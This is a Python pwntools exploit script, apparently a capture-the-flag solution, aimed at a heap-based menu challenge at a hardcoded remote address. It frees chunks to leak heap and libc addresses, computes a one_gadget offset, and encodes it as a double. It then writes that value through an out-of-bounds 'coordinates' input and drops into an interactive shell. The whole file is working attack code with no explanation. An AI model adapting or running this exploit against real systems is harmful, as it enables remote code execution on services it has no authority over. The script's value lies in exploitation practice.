from pwn import *

def create(size, index):
    r.sendlineafter(b'>> ', b'1')
    r.sendlineafter(b'tier: ', size)
    r.sendlineafter(b'(5-9): ', str(index).encode())

def free(index):
    r.sendlineafter(b'>> ', b'2')
    r.sendlineafter(b'position: ', str(index).encode())

def view(index):
    r.sendlineafter(b'>> ', b'3')
    r.recvuntil(b'['+ index + b']: ')

def coords(point):
    r.sendlineafter(b'coordinates: ', point)

def double_pointer(pointer_value):
    '''Convert x64 pointer to double representation'''
    byte_string = p64(pointer_value)
    print(byte_string)
    print(type(byte_string))
    hex_byte_string = binascii.hexlify(byte_string)
    return struct.unpack('<d', byte_string)[0]

r = remote('94.237.51.10', 46883)

for i in range(7):
    create(b'128', i)

free(0)

view(b'0')

heap_leak = r.recvline().strip()
heap_leak = u64(heap_leak.strip().ljust(8, b"\x00")) << 12
print("Heap leak at: ", hex(heap_leak))

create(b'128', 0)
create(b'128', 7)
create(b'128',8)
create(b'16', 9)

for i in range(7):
    free(i)

free(8)
free(7)

view(b'8')

libc_leak = r.recvline().strip()
libc_address = u64(libc_leak.strip().ljust(8, b"\x00")) - 0x219CE0
print("Libc address at: ", hex(libc_address))

r.sendlineafter(b'>> ', b'4')
r.sendlineafter(b'attacks: ', b'36')
for i in range(33):
    coords(b'.')

coords(b'.')
coords(b'.')
one_gadget = libc_address + 0xebc88
print(hex(one_gadget))
coords(str(double_pointer(one_gadget)).encode())

r.interactive()
